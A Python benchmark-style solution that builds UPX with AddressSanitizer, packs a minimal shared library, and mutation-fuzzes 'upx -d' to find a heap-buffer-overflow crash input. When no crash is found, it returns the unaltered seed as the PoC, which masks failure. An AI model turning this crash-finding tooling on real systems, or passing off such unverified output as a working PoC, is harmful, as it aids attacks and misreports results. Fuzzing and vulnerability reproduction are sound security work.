import os
import sys
import subprocess
import shutil
import tempfile
import random
import time
import concurrent.futures

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        Args:
            src_path: Path to the vulnerable source code tarball
        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        work_dir = tempfile.mkdtemp()
        
        try:
            # 1. Extract source code
            try:
                subprocess.check_call(['tar', 'xf', src_path, '-C', work_dir], 
                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception:
                # If extraction fails, we might be unable to proceed, but continue to try finding files
                pass

            # 2. Locate source root and build UPX
            src_root = work_dir
            for root, dirs, files in os.walk(work_dir):
                if 'Makefile' in files and ('src' in dirs or 'upx.out' in files):
                    src_root = root
                    break
            
            # Setup environment for ASAN build
            env = os.environ.copy()
            env['CC'] = 'clang'
            env['CXX'] = 'clang++'
            env['CFLAGS'] = '-fsanitize=address -g -O1'
            env['CXXFLAGS'] = '-fsanitize=address -g -O1'
            env['LDFLAGS'] = '-fsanitize=address'
            
            # Attempt to build
            built = False
            build_paths = [src_root]
            if os.path.isdir(os.path.join(src_root, 'src')):
                build_paths.insert(0, os.path.join(src_root, 'src'))
            
            for path in build_paths:
                if os.path.exists(os.path.join(path, 'Makefile')):
                    try:
                        subprocess.run(['make', '-j8'], cwd=path, env=env, 
                                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
                        built = True
                        break
                    except subprocess.CalledProcessError:
                        continue
            
            # If make failed, try cmake if present
            if not built and os.path.exists(os.path.join(src_root, 'CMakeLists.txt')):
                try:
                    bdir = os.path.join(src_root, 'build_cmake')
                    os.makedirs(bdir, exist_ok=True)
                    subprocess.run(['cmake', '..'], cwd=bdir, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.run(['make', '-j8'], cwd=bdir, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                except:
                    pass

            # Find the UPX binary
            upx_bin = None
            for root, dirs, files in os.walk(work_dir):
                if 'upx.out' in files:
                    upx_bin = os.path.join(root, 'upx.out')
                    break
                if 'upx' in files:
                    cand = os.path.join(root, 'upx')
                    if os.access(cand, os.X_OK):
                        upx_bin = cand
                        break
            
            if not upx_bin:
                return b''

            # 3. Generate a seed file (Packed ELF Shared Library)
            # Vulnerability is in decompression of ELF shared libraries.
            # We create a minimal shared object.
            source_c = os.path.join(work_dir, 'poc.c')
            with open(source_c, 'w') as f:
                f.write('void init_func(){}\n')
            
            so_path = os.path.join(work_dir, 'poc.so')
            # Compile with DT_INIT set (-Wl,-init,...)
            # Try clang then gcc
            compiled = False
            compilers = ['clang', 'gcc']
            for cc in compilers:
                try:
                    subprocess.run([cc, '-shared', '-fPIC', '-Os', '-s', 'poc.c', '-o', 'poc.so', '-Wl,-init,init_func'],
                                   cwd=work_dir, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    compiled = True
                    break
                except:
                    continue
            
            if not compiled:
                return b''

            # Pack with UPX
            seed_upx = os.path.join(work_dir, 'seed.upx')
            # Use -1 for fast/small compression. 
            subprocess.run([upx_bin, '-1', '-f', '-o', seed_upx, so_path],
                           cwd=work_dir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            if not os.path.exists(seed_upx):
                return b''

            with open(seed_upx, 'rb') as f:
                seed_data = bytearray(f.read())

            # 4. Fuzzing to trigger vulnerability
            # We look for Heap Buffer Overflow in ASAN output
            found_poc = None
            start_time = time.time()
            time_limit = 300 # 5 minutes max
            
            def fuzz_worker(tid):
                rng = random.Random()
                rng.seed(time.time() + tid)
                local_data = bytearray(seed_data)
                
                while time.time() - start_time < time_limit:
                    # Mutation
                    curr = bytearray(local_data)
                    # Mutate 1-5% of bytes
                    num_mutations = rng.randint(1, max(1, len(curr) // 50))
                    for _ in range(num_mutations):
                        idx = rng.randint(0, len(curr) - 1)
                        op = rng.randint(0, 3)
                        if op == 0: # Random byte
                            curr[idx] = rng.randint(0, 255)
                        elif op == 1: # Bit flip
                            curr[idx] ^= (1 << rng.randint(0, 7))
                        elif op == 2: # Arithmetic
                            curr[idx] = (curr[idx] + rng.randint(-10, 10)) & 0xFF
                        elif op == 3: # Interesting values
                            curr[idx] = rng.choice([0, 0xFF, 0x7F, 0x80])
                    
                    # Test
                    fname = os.path.join(work_dir, f'fuzz_{tid}_{rng.randint(0, 100000)}.upx')
                    with open(fname, 'wb') as f:
                        f.write(curr)
                    
                    try:
                        # -d to decompress/test, -o /dev/null to discard output
                        res = subprocess.run([upx_bin, '-d', '-o', os.devnull, fname],
                                             stdout=subprocess.DEVNULL,
                                             stderr=subprocess.PIPE,
                                             env=env,
                                             timeout=1)
                        
                        if res.returncode != 0:
                            if b'AddressSanitizer' in res.stderr and b'heap-buffer-overflow' in res.stderr:
                                return bytes(curr)
                    except Exception:
                        pass
                    finally:
                        if os.path.exists(fname):
                            os.remove(fname)
                return None

            # Run parallel fuzzers
            with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
                futures = [executor.submit(fuzz_worker, i) for i in range(8)]
                for f in concurrent.futures.as_completed(futures):
                    res = f.result()
                    if res:
                        found_poc = res
                        executor.shutdown(wait=False)
                        break
            
            # Return found PoC or original seed if no crash found
            return found_poc if found_poc else bytes(seed_data)

        except Exception:
            return b''
        finally:
            shutil.rmtree(work_dir, ignore_errors=True)
